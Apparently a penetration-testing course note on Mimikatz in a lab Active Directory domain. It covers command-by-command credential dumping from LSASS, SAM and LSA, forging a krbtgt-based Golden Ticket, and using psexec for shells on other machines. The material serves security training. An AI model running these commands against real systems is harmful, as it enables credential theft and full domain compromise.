# Mimikatz

Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks

- dumps credentials stores in memory
- A few attacks:
	- Credential Dumping
	- Pass-the-Hash 
	- Over-Pass-the-Hash
	- Pass-the-Ticket
	- Golden Ticket
	- Silver Ticket


Very likely to be picked up / caught

mimikatz changes all the time, might not work the same by the time we use it

We will learn how to keep persistance and have a 'Golden Ticket'

## Credential Dumping with Mimikatz
Go on github page and download mimikatz_trunk.zip straight to our DC
We will assume we have compromised the DC.

Mimikatz wiki very helpful (learn about different modules)

```
C:\Users\Administrator\Downloads>mimikatz.exe
```
Syntax something like `module::option`

![mim-0](https://user-images.githubusercontent.com/87711310/209465545-0127faf5-10ee-49e3-8a16-44a7f3a96772.png)

debug means it is allowing us to debug a process that we would otherwise not have access to.
`Privilege '20' OK`

We are going to attempt to dump some info out of memory. We need to be able to bypass the memory protections in place
Especially for the lsass.exe for example

We will run a few attacks

First: 
```
securlsa::logonpasswords
```

![mim-1](https://user-images.githubusercontent.com/87711310/209465544-49660e87-5934-4864-89ae-1d021942e96c.png)

We get NTLM hashes, accounts that are logged in, etc. 
wdigest is a feature that in Windows 7 and below stored passwords in cleartext. The feature still exists even if it was patched in Windows 8 and above. If we turn it on, it will store passwords in cleartext and if we wait and someone logs out and in we will get the pass in cleartext

Can try and get the sam
```
lsadump::sam
lsadump::sam /patch
```
even if these don't work, there are other ways we have learned

```
lsadump::lsa /patch
```

![mim-2](https://user-images.githubusercontent.com/87711310/209465546-66b0736f-fc6d-4c85-b07a-ecf9956ad2b4.png)

LSA == Local Security Authority
- A protected subsystem in Windows Authentication
- It authenticates and creates logon sessions to the local computer 
We are on a DC and we are dumping the LSA here, this is one option

We are looking at usernames and NTLM hashes. So can just try to crack them offline... (hashcat etc.). It does matter to see what percentage of passwords we crack to comment on how strong the client's password policy is. It gives them a number to put on their policy. 

Other option, we can download the NTDS.dit file which will contain all the credentials as well

## Golden Ticket

krbtgt account > we can generate tickets from there
Previously, we got the hash for it
PIC

Like that, we get to generate Kerberos TGT's 
With a Kerberos TGT we can request access to any system or resource on the domain using the Ticket granting service
- When we have a **golden ticket** it means we have full access to the entire domain, all the machines we can get shell's on, can get all files, all folders etc.

```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
```

![mim-3](https://user-images.githubusercontent.com/87711310/209465547-f08eefad-c766-402b-86cd-ae3cd043288a.png)

like that, we only pull the krbtgt user


Need to copy domain SID and Primary NTLM 

![mim-4](https://user-images.githubusercontent.com/87711310/209465548-8726ba26-8eee-4357-b265-dd214530f3bf.png)

Syntax:
```
kerberos::golden /User:FakeAdmin /domain:marvel.local /sid:<domain_SID> /krbtgt:<krbNTLMprimary> /id:500 /ptt
```
The admin account 'rid' is 500
ptt for pass the ticket, i.e. pass the ticket along to the next (current or next) session. We will use this ticket to open up a CMD prompt, and that will be able to access any computer we want 

![mim-5](https://user-images.githubusercontent.com/87711310/209465542-e912b421-dab1-4144-bd6a-882315f2ebfa.png)

Then do
```
mimikatz # misc::cmd
```

That will open a new cmd prompt window

![mim-6](https://user-images.githubusercontent.com/87711310/209465543-d228654f-5df8-468d-8ca0-83a868428cb8.png)

can access any computer (e.g. DARTHVADER or SPOCK)

Can even download psexec.exe (it is a Windows tool) and run it on the machine and get shells. And run it against the computers and we can get a shell like that:
```
psexec.exe \\DARTHVADER cmd.exe
```

